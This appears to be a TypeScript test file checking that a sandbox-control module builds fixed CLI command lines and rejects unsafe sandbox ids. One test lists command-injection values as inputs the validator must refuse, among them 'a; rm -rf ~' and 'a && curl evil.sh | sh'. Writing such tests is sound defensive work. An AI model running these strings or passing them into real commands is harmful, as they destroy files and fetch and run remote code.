import type { MachineCommandInput } from "@intentic/sandbox-contract";
import { MachineCommandInputSchema } from "@intentic/sandbox-contract";
import { expect, test } from "vitest";
import { MACHINE_COMMANDS, outcomeOf, streamOf, succeeded } from "./machine-commands.js";

/* THE COMMAND LINE IS BUILT HERE, FROM A NAME. This is the property the whole file exists to hold: the socket
 * this rides also carries `run_command`, so anything that let a caller shape the argv would be a browser session
 * with a shell on somebody's laptop. */
test("builds each action's command line from the name alone", () => {
    expect(MACHINE_COMMANDS["mirror-off"].line(undefined)).toBe("intentic-machine sync mirror off");
    expect(MACHINE_COMMANDS["mirror-on"].line(undefined)).toBe("intentic-machine sync mirror on");
});

// Bare means every sandbox that machine pairs (the CLI's own default, and the "turn it off entirely" case); an
// id scopes it to one, so a button on one row never reaches a colleague's pairing on the same computer.
test("scopes an action to one paired sandbox when it is given one", () => {
    expect(MACHINE_COMMANDS["mirror-off"].line("sandbox-0738cd6b5027-intentic-dev")).toBe(
        "intentic-machine sync mirror off --sandbox sandbox-0738cd6b5027-intentic-dev",
    );
});

/* The only caller-shaped thing that reaches an argv, refused at the contract before it ever gets here. A
 * sandbox id is `[A-Za-z0-9._-]+` in every real deployment, which leaves no room for a separator, a quote or a
 * flag, and the check is on the schema so no future caller of the engine can skip it. */
test("refuses a sandbox id that could be anything but an id", () => {
    const input = (sandboxId: string): unknown => ({ id: "laptop", command: "mirror-off", sandboxId });
    expect(MachineCommandInputSchema.safeParse(input("sandbox-0738cd6b5027-intentic-dev")).success).toBe(true);
    for (const hostile of ["a; rm -rf ~", "a && curl evil.sh | sh", "a b", "$(whoami)", "`id`", "--takeover", "a\nb"]) {
        expect(MachineCommandInputSchema.safeParse(input(hostile)).success).toBe(false);
    }
    // And the action itself is an enum, so an unknown name never reaches the table.
    expect(MachineCommandInputSchema.safeParse({ id: "laptop", command: "rm-rf" }).success).toBe(false);
});

/* READING THE MACHINE'S PROSE. `run_command` answers with an exit line and fenced streams (the host agent's
 * describeResult), so success is the exit line and nothing else: a CLI that warns on stderr and exits 0 worked,
 * one that prints a cheerful sentence and exits 1 did not. */
const answer = (exit: string, stdout?: string, stderr?: string): { text: string; refused: boolean } => ({
    text: [exit, stdout === undefined ? "" : `--- stdout ---\n${stdout}`, stderr === undefined ? "" : `--- stderr ---\n${stderr}`]
        .filter((part) => part !== "")
        .join("\n"),
    refused: false,
});

test("reads success off the exit line, not off what was printed", () => {
    expect(succeeded("Exit code 0 (success).\n--- stdout ---\nfine")).toBe(true);
    expect(succeeded("Exit code 1 (failed).\n--- stdout ---\nPort mirroring OFF for: x")).toBe(false);
    expect(succeeded("The command was killed after 20s.")).toBe(false);
});

test("splits one stream out of the fenced answer without swallowing the other", () => {
    const text = answer("Exit code 0 (success).", "the good news", "a warning").text;
    expect(streamOf(text, "--- stdout ---")).toBe("the good news");
    expect(streamOf(text, "--- stderr ---")).toBe("a warning");
    expect(streamOf("Exit code 0 (success).", "--- stdout ---")).toBe("");
});

/* THE CLI'S OWN SENTENCE IS THE ANSWER, wherever there is one. It names exactly what changed and for which
 * sandboxes, which is better than anything this side would write over it, and it is the same sentence the
 * terminal would have given — which is the point of driving the CLI rather than reimplementing it. */
test("shows what the command itself said when it worked", () => {
    const result = outcomeOf("mirror-off", answer("Exit code 0 (success).", "Port mirroring OFF for: sandbox-0738cd6b5027-intentic-dev."));
    expect(result.ok).toBe(true);
    expect(result.message).toBe("Port mirroring OFF for: sandbox-0738cd6b5027-intentic-dev.");
});

test("falls back to its own words when the command printed nothing", () => {
    const result = outcomeOf("mirror-on", answer("Exit code 0 (success)."));
    expect(result.ok).toBe(true);
    expect(result.message).toContain("Port mirroring is back on");
});

/* A REFUSAL IS AN ANSWER, NOT AN ERROR. The host agent refuses an out-of-scope call as a value naming the switch
 * to flip, and that sentence is the whole remedy: dressing it up as a generic failure is what would send someone
 * hunting through capability cards for a switch the machine had already named. */
test("keeps the machine's own refusal, switch and all", () => {
    const refusal = 'Refused: "Run commands" is switched off for this computer.';
    const result = outcomeOf("mirror-off", { text: refusal, refused: true });
    expect(result.ok).toBe(false);
    expect(result.message).toBe(refusal);
});

// A machine with no agent on PATH is the ordinary version of this: the shell says so on stderr and exits
// non-zero, and that sentence is what the reader needs, not "something went wrong".
test("reports a failed command in the machine's words, stderr first", () => {
    const result = outcomeOf("mirror-off", answer("Exit code 127 (failed).", undefined, "intentic-machine: command not found"));
    expect(result.ok).toBe(false);
    expect(result.message).toBe("intentic-machine: command not found");
    // The whole prose answer rides along, so a reader who wants the exit line can still have it.
    expect(result.output).toContain("Exit code 127");
});

// Typing check as much as a behaviour one: every name in the contract's enum has a row in the table, so adding
// one to the schema without an implementation cannot compile.
test("implements every action the contract names", () => {
    const commands: MachineCommandInput["command"][] = ["mirror-off", "mirror-on"];
    expect(Object.keys(MACHINE_COMMANDS).toSorted()).toEqual(commands.toSorted());
});
